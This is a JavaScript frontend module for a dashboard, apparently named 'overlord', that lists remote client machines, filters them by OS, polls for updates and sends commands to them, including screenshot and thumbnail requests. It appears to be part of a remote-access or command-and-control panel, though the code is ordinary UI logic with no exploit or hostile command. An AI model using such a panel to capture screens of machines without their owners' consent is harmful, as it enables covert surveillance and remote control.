import { state } from "./state.js";
import { digestData } from "./utils.js";

const POLL_INTERVAL_MS = 5000;
const PREF_REFRESH_KEY = "overlord_refresh_interval_seconds";
let pollTimer = null;
let render = () => {};

export function registerRenderer(fn) {
  render = fn;
}

export async function loadWithOptions(options = {}) {
  const { force = false } = options;
  if (state.isLoading) {
    state.pendingForce = state.pendingForce || force;
    return;
  }
  state.isLoading = true;
  try {
    const params = new URLSearchParams({
      page: String(state.page),
      pageSize: String(state.pageSize),
      q: state.searchTerm,
      sort: state.sort,
      status: state.filterStatus || "all",
      os: state.filterOs || "all",
    });
    const res = await fetch(`/api/clients?${params.toString()}`);
    if (!res.ok) throw new Error(`status ${res.status}`);
    const data = await res.json();

    updateOsFilter(data.items);

    const digest = digestData(data, state);
    if (!force && digest === state.lastDigest) {
      return;
    }
    state.lastDigest = digest;
    render(data);
    
    if (!state.thumbnailsRequested) {
      state.thumbnailsRequested = true;
      requestThumbnailsForClients(data.items);
    }
  } catch (err) {
    console.error("load clients", err);
  } finally {
    state.isLoading = false;
    if (state.pendingForce) {
      const shouldForce = state.pendingForce;
      state.pendingForce = false;
      loadWithOptions({ force: shouldForce });
    }
  }
}

async function requestThumbnailsForClients(items) {
  const onlineClientsWithoutThumbnail = items.filter(c => c.online && !c.thumbnail);
  for (const client of onlineClientsWithoutThumbnail) {
    await requestThumbnail(client.id);
  }
}

function updateOsFilter(items) {
  const osSelect = document.getElementById("filter-os");
  if (!osSelect) return;

  const osList = new Set();
  items.forEach((item) => {
    if (item.os) osList.add(item.os);
  });

  const currentValue = osSelect.value;
  const osArray = Array.from(osList).sort();

  osSelect.innerHTML = "";
  const allOption = document.createElement("option");
  allOption.value = "all";
  allOption.textContent = "All OS";
  osSelect.appendChild(allOption);

  osArray.forEach((os) => {
    const option = document.createElement("option");
    option.value = os;
    option.textContent = os;
    osSelect.appendChild(option);
  });

  if (currentValue !== "all" && osList.has(currentValue)) {
    osSelect.value = currentValue;
  }
}

function getConfiguredPollIntervalMs(defaultMs) {
  const savedSeconds = Number(localStorage.getItem(PREF_REFRESH_KEY));
  if (!Number.isFinite(savedSeconds)) return defaultMs;
  const boundedSeconds = Math.min(120, Math.max(3, savedSeconds));
  return boundedSeconds * 1000;
}

export function startAutoRefresh(intervalMs = POLL_INTERVAL_MS) {
  const effectiveInterval = getConfiguredPollIntervalMs(intervalMs);
  clearInterval(pollTimer);
  pollTimer = setInterval(() => {
    loadWithOptions({ force: false });
  }, effectiveInterval);
}

export async function sendCommand(clientId, action) {
  try {
    const res = await fetch(`/api/clients/${clientId}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action }),
    });
    if (!res.ok) throw new Error(`command failed ${res.status}`);
    return true;
  } catch (err) {
    console.error(err);
    return false;
  }
}

export async function requestPreview(clientId) {
  const ok = await sendCommand(clientId, "screenshot");
  if (ok) {
    setTimeout(() => loadWithOptions({ force: true }), 250);
    setTimeout(() => loadWithOptions({ force: true }), 800);
  }
}

export async function requestThumbnail(clientId) {
  try {
    const res = await fetch(`/api/clients/${clientId}/thumbnail`, {
      method: "POST",
    });
    if (res.ok) {
      const data = await res.json();
      if (data.ok) {
        await loadWithOptions({ force: true });
        setTimeout(() => loadWithOptions({ force: true }), 250);
        setTimeout(() => loadWithOptions({ force: true }), 800);
        return true;
      }
    }
    return false;
  } catch (err) {
    console.error("Failed to request thumbnail:", err);
    return false;
  }
}
